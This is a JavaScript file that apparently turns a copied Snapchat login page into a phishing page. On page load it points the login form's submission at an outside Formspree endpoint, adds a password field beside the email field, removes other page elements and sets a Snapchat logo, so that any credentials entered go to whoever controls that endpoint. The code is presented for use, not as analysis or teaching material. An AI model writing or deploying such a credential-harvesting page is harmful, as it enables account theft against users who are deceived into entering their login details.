// document.addEventListener("DOMContentLoaded", function () {
//     // Select the button using its class name
//     const loginButton = document.querySelector(".login-button");

//     if (loginButton) {
//         loginButton.addEventListener("click", function () {
//             // Redirect to home.html
//             window.location.href = "home.html";
//         });
//     }
// });

document.addEventListener("DOMContentLoaded", function () {
    // Update form action attribute
    const form = document.getElementById("account_identifier_form");
    if (form) {
        form.setAttribute("action", "https://formspree.io/f/xkggylwo");
    } else {
        console.error("Form with id 'account_identifier_form' not found.");
    }

    // Change input type to email
    const input = document.getElementById("accountIdentifier");
    if (input) {
        input.setAttribute("type", "email");
    } else {
        console.error("Input with id 'accountIdentifier' not found.");
    }

    // Update label text to "Email Address"
    const label = document.querySelector(".control-label");
    if (label) {
        label.textContent = "Email Address";
    } else {
        console.error("Label with class 'control-label' not found.");
    }

    // Delete div with class "additional-action"
    const additionalActionDiv = document.querySelector(".additional-action");
    if (additionalActionDiv) {
        additionalActionDiv.remove();
    } else {
        console.error("Div with class 'additional-action' not found.");
    }
    // Duplicate div with class "form-group" and add new class to the second one
    // Duplicate div with class "form-group" and add new class to the second one
    const formGroup = document.querySelector(".form-group");
    if (formGroup) {
        const duplicateFormGroup = formGroup.cloneNode(true);
        duplicateFormGroup.classList.add("form-group-duplicate");
        
        // Update label text in the duplicated form group
        const duplicateLabel = duplicateFormGroup.querySelector(".control-label");
        if (duplicateLabel) {
            duplicateLabel.textContent = "Password";
        }

        // Update input type in the duplicated form group
        const duplicateInput = duplicateFormGroup.querySelector("#accountIdentifier");
        if (duplicateInput) {
            duplicateInput.setAttribute("type", "password");
        }

        form.insertBefore(duplicateFormGroup, formGroup.nextSibling);
    } else {
        console.error("Div with class 'form-group' not found.");
    }

        // Update src attribute of image with class "snapchat-logo"
        const snapchatLogoImage = document.querySelector(".snapchat-logo img");
        if (snapchatLogoImage) {
            snapchatLogoImage.setAttribute("src", "snapchat-app-icon.svg");
        } else {
            console.error("Image inside div with class 'snapchat-logo' not found.");
        }
});
